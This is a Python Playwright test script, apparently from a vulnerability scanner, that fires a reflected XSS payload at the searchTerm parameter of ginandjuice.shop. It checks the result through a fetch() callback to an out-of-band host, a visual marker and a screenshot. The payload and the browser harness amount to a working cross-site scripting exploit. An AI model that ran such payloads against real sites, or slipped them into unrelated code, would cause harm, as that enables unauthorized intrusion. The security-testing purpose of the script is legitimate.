#!/usr/bin/env python3
"""
Quick test to verify working XSS payload with Interactsh callback
"""
import asyncio
from playwright.async_api import async_playwright

async def test_working_payload():
    """Test the payload that worked in the legacy scan"""
    
    # Simulated Interactsh URL
    callback_url = "test123.oast.fun"
    
    # The payload that WORKED in the legacy scan (from the report)
    working_payload = f'<div style="color:red;font-size:30px;position:fixed;top:0;left:0;z-index:9999;background:yellow;padding:20px">BUGTRACE-XSS-CONFIRMED: <script>fetch("https://{callback_url}/poc")</script></div>'
    
    print("=" * 70)
    print("TESTING WORKING PAYLOAD FORMAT")
    print("=" * 70)
    print(f"\nPayload: {working_payload[:80]}...\n")
    
    url = f"https://ginandjuice.shop/catalog?searchTerm={working_payload}"
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        page = await browser.new_page()
        
        # Capture network requests
        requests = []
        page.on('request', lambda req: requests.append(req.url))
        
        print(f"Loading URL...")
        await page.goto(url, wait_until='networkidle', timeout=10000)
        
        # Wait for JS execution
        await asyncio.sleep(3)
        
        # Check if callback was made
        callback_made = any(callback_url in req for req in requests)
        
        print(f"\n📊 Results:")
        print(f"  - Total requests: {len(requests)}")
        print(f"  - Callback to {callback_url}: {'✅ YES' if callback_made else '❌ NO'}")
        
        # Check for visual marker
        content = await page.content()
        has_marker = "BUGTRACE-XSS-CONFIRMED" in content
        print(f"  - Visual marker found: {'✅ YES' if has_marker else '❌ NO'}")
        
        # Check for the div element
        div_count = await page.evaluate("""
            () => {
                const divs = document.querySelectorAll('div[style*="position:fixed"]');
                return divs.length;
            }
        """)
        print(f"  - Fixed position divs: {div_count}")
        
        # Take screenshot
        screenshot_path = "/tmp/working_payload_test.png"
        await page.screenshot(path=screenshot_path)
        print(f"\n📸 Screenshot: {screenshot_path}")
        
        if callback_made:
            print("\n✅ SUCCESS: Payload triggered callback!")
        else:
            print("\n⚠️  Callback not triggered (or fetch blocked)")
        
        await browser.close()

if __name__ == "__main__":
    asyncio.run(test_working_payload())
